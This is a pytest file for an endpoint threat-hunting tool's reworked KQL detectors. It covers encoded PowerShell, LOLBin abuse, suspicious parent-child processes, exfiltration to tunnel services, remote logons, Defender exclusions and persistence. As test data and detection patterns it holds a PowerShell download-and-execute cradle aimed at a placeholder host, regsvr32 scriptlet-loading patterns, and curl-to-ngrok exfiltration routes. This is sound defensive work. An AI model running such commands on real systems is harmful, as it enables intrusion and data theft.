"""The six low-volume detectors after the 2026-09-30 review — the properties that took them from
~48 findings a day (all benign on UAT) to ~38 a week, pinned so a later edit cannot quietly
undo one. Each module's docstring has the measurements.

Run: python -m pytest shadow_hunter/detector_rework_test.py -q
"""
from __future__ import annotations

import asyncio

from shadow_hunter.detectors.base import kql_shape
from shadow_hunter.detectors import (DefenderExclusionsDetector, EncodedPowerShellDetector,
                                     ExfilPatternsDetector, LOLBinAbuseDetector,
                                     RemoteLogonsDetector, SuspiciousParentChildDetector)
from shadow_hunter.detectors import defender_exclusions, encoded_powershell, exfil_patterns
from shadow_hunter.detectors import lolbin_abuse, remote_logons, suspicious_parent_child

REWORKED = (EncodedPowerShellDetector, SuspiciousParentChildDetector, LOLBinAbuseDetector,
            ExfilPatternsDetector, RemoteLogonsDetector, DefenderExclusionsDetector)


def test_no_detector_hides_devices_that_already_alerted():
    # An attacker on a device that tripped something else is the case that matters most.
    for d in REWORKED:
        kql = d().kql(24)
        assert "AlertEvidence" not in kql and "BehaviorAnalytics" not in kql, d.name


def test_replay_window_is_substituted():
    for mod in (encoded_powershell, suspicious_parent_child, lolbin_abuse, exfil_patterns,
                remote_logons, defender_exclusions):
        assert "let windowEnd = datetime(2026-09-10T12:00:00Z);" in mod.build_kql(end="datetime(2026-09-10T12:00:00Z)")


def test_shape_normalises_the_per_machine_parts():
    s = kql_shape("X")
    assert "<userdir>" in s and "<guid>" in s and '"#"' in s and "https?://" in s


def test_command_detectors_judge_by_fleet_rarity():
    for mod in (encoded_powershell, suspicious_parent_child, lolbin_abuse):
        kql = mod.build_kql(max_fleet_devices=2, history_days=7)
        assert "FleetDevices <= 2" in kql and "windowEnd - 7d" in kql, mod.__name__


# ── encoded_powershell ───────────────────────────────────────────────────────

def test_payload_is_decoded_before_rarity():
    kql = encoded_powershell.build_kql()
    assert "base64_decode_tostring(Payload)" in kql and "iff(isnotempty(Decoded), Decoded" in kql


def _ps(**kw):
    return {"DeviceId": "d1", "DeviceName": "host1", "Accounts": ["system"], "InitiatingProcessFileName": "svc.exe",
            "ProcessCommandLine": "powershell -enc AAAA", "Decoded": "Get-Date", "FleetDevices": 1, **kw}


def test_download_content_is_high_plain_content_medium():
    d = EncodedPowerShellDetector()
    assert d.to_findings([_ps()])[0]["severity"] == "medium"
    assert d.to_findings([_ps(Decoded="IEX (New-Object Net.WebClient).DownloadString('http://x')")])[0]["severity"] == "high"
    assert d.to_findings([_ps(InitiatingProcessFileName="WINWORD.EXE")])[0]["severity"] == "high"


def test_decoded_content_is_redacted_in_the_summary():
    f = EncodedPowerShellDetector().to_findings([_ps(Decoded="$k='AKIAABCDEFGHIJKLMNOP'")])[0]
    assert "AKIAABCDEFGHIJKLMNOP" not in f["summary"]


# ── suspicious_parent_child ──────────────────────────────────────────────────

def test_browser_helpers_are_medium_office_children_high():
    d = SuspiciousParentChildDetector()
    row = {"DeviceName": "h", "SampleCommandLines": ["cmd /c x"], "Count": 1, "FleetDevices": 1}
    assert d.to_findings([{**row, "InitiatingProcessFileName": "chrome.exe", "FileName": "cmd.exe"}])[0]["severity"] == "medium"
    assert d.to_findings([{**row, "InitiatingProcessFileName": "WINWORD.EXE", "FileName": "cmd.exe"}])[0]["severity"] == "high"
    assert d.to_findings([{**row, "InitiatingProcessFileName": "chrome.exe", "FileName": "powershell.exe"}])[0]["severity"] == "high"


def test_findings_are_per_device_not_credited_to_the_first_of_a_fleet_set():
    kql = suspicious_parent_child.build_kql()
    assert "by DeviceId, DeviceName, InitiatingProcessFileName, FileName, Shape" in kql


def test_macos_office_children_are_covered():
    assert '"microsoft word"' in suspicious_parent_child.build_kql()


# ── lolbin_abuse ─────────────────────────────────────────────────────────────

def test_silent_regsvr32_alone_no_longer_matches():
    kql = lolbin_abuse.build_kql()
    assert '"/s"' not in kql and '"/i:http"' in kql and '"scrobj.dll"' in kql


def test_opening_a_link_and_clickonce_are_not_lolbin_abuse():
    kql = lolbin_abuse.build_kql()
    assert "fileprotocolhandler|openurl" in kql and 'contains "dfshim.dll"' in kql


def test_webdav_only_to_a_raw_public_ip():
    kql = lolbin_abuse.build_kql()
    assert 'not(ProcessCommandLine contains "davsetcookie")' in kql and "ipv4_is_private(DavIP)" in kql


# ── remote_logons ────────────────────────────────────────────────────────────

def test_rdp_is_judged_against_the_accounts_own_history():
    kql = remote_logons.build_kql(history_days=14)
    assert "windowStart - 14d" in kql and "where Public or NewAccount or (NewTarget and NewSource)" in kql
    assert "LogonCount < 5" not in kql


def test_public_source_is_high_and_the_reason_is_stated():
    d = RemoteLogonsDetector()
    base = {"DeviceName": "srv", "AccountName": "bob", "SourceIPs": ["8.8.8.8"], "LogonCount": 1}
    assert d.to_findings([{**base, "Public": True}])[0]["severity"] == "high"
    f = d.to_findings([{**base, "SourceIPs": ["10.1.1.1"], "NewTarget": True, "NewSource": True, "HistTargets": 3}])[0]
    assert f["severity"] == "medium" and "new target and new source" in f["summary"]


def test_jump_host_allowlist_still_reads_source_ips():
    f = RemoteLogonsDetector().to_findings([{"DeviceName": "s", "AccountName": "a", "SourceIPs": ["192.168.75.10"],
                                             "NewAccount": True}])[0]
    assert f["raw"]["SourceIPs"] == ["192.168.75.10"]


# ── exfil_patterns ───────────────────────────────────────────────────────────

def test_exfil_sees_macs_and_skips_browsers():
    kql = exfil_patterns.build_kql()
    assert "isempty(RemoteIPType)" in kql and 'Proc has "chrome"' in kql
    assert "sustained connection" not in kql.lower() and "ConnectionCount > 500" not in kql


def test_exfil_owns_tunnels():
    assert "ngrok-free.dev" in exfil_patterns.SERVICE_SUFFIXES and "transfer.sh" in exfil_patterns.SERVICE_SUFFIXES


def _net(**kw):
    return {"DeviceName": "h", "InitiatingProcessFileName": "curl", "Hosts": ["abc.ngrok-free.dev"],
            "ConnectionCount": 2, **kw}


def test_cli_tools_are_high_proxies_medium_and_services_are_named():
    d = ExfilPatternsDetector()
    f = d.to_findings([_net()])[0]
    assert f["severity"] == "high" and f["indicator"] == "curl->ngrok-free.dev"
    p = d.to_findings([_net(InitiatingProcessFileName="tinyproxy")])[0]
    assert p["severity"] == "medium" and "relayed by a proxy" in p["summary"]
    assert d.to_findings([_net(InitiatingProcessFileName="python3.12")])[0]["severity"] == "high"


def test_lookalike_hosts_are_not_services():
    assert exfil_patterns._service("notngrok-free.dev.example.com") == ""
    assert exfil_patterns._service("x.webhook.site") == "webhook.site"


# ── defender_exclusions ──────────────────────────────────────────────────────

def test_one_writer_command_is_one_finding():
    kql = defender_exclusions.build_kql()
    assert "Values = make_set(Value, 25)" in kql and "by DeviceName, InitiatingProcessFileName" in kql


def test_macos_mdatp_exclusions_are_covered():
    assert 'FileName =~ "mdatp"' in defender_exclusions.build_kql()


def test_extension_exclusions_are_critical():
    d = DefenderExclusionsDetector()
    f = d.to_findings([{"DeviceName": "h", "InitiatingProcessFileName": "powershell.exe",
                        "ExclusionTypes": ["Extensions"], "Values": [".exe"]}])[0]
    assert f["severity"] == "critical" and "1 Defender exclusion(s)" in f["summary"]


# ── mock rows from before the rework still convert ───────────────────────────

def test_old_shape_mock_rows_still_convert():
    from shadow_hunter.clients.defender_mock import MockDefenderClient
    for d in REWORKED:
        inst = d()
        rows = asyncio.run(MockDefenderClient().hunt(inst.query_name))
        out = inst.to_findings(rows)
        assert len(out) == len(rows) and all(f["device_name"] for f in out), inst.name


# ── new to the fleet AND already widespread ──────────────────────────────────

def test_command_detectors_also_catch_a_push_to_many_machines():
    from shadow_hunter.detectors import rare_persistence
    for mod in (encoded_powershell, suspicious_parent_child, lolbin_abuse, rare_persistence):
        kql = mod.build_kql()
        assert "PriorDevices = dcountif(DeviceId, Timestamp < windowStart)" in kql, mod.__name__
        assert "or PriorDevices == 0" in kql and "windowEnd - 14d" in kql, mod.__name__
        assert "(scored | where Mass" in kql or "(persisted | where Mass" in kql, mod.__name__


def test_persistence_namespaces_are_judged_on_the_days_before_the_window():
    from shadow_hunter.detectors import rare_persistence
    kql = rare_persistence.build_kql()
    assert kql.count("between (historyStart .. windowStart)") == 2


def test_run_keys_into_windows_folders_are_no_longer_skipped():
    from shadow_hunter.detectors import rare_persistence
    kql = rare_persistence.build_kql()
    assert 'Exe startswith "c:\\\\windows' not in kql and 'Exe startswith "c:\\\\programdata' not in kql
    assert 'Exe startswith "c:\\\\program files"' in kql


def test_mass_rows_become_one_high_finding_for_the_push():
    from shadow_hunter.detectors import RarePersistenceDetector
    mass = {"Mass": True, "FleetDevices": 40, "Devices": ["a", "b"], "DeviceName": "40 devices", "Count": 40}
    ps = EncodedPowerShellDetector().to_findings([_ps(**mass)])[0]
    assert ps["severity"] == "high" and ps["indicator"].startswith("mass|") and "NEW to the fleet today on 40" in ps["summary"]
    pc = SuspiciousParentChildDetector().to_findings([{**mass, "InitiatingProcessFileName": "chrome.exe", "FileName": "cmd.exe",
                                                       "SampleCommandLines": ["cmd /c x"]}])[0]
    assert pc["severity"] == "high"
    rp = RarePersistenceDetector().to_findings([{**mass, "Mechanism": "launchd", "Item": "com.x.plist", "Writers": ["bash"]}])[0]
    assert rp["severity"] == "high" and rp["indicator"] == "mass:launchd:com.x.plist"
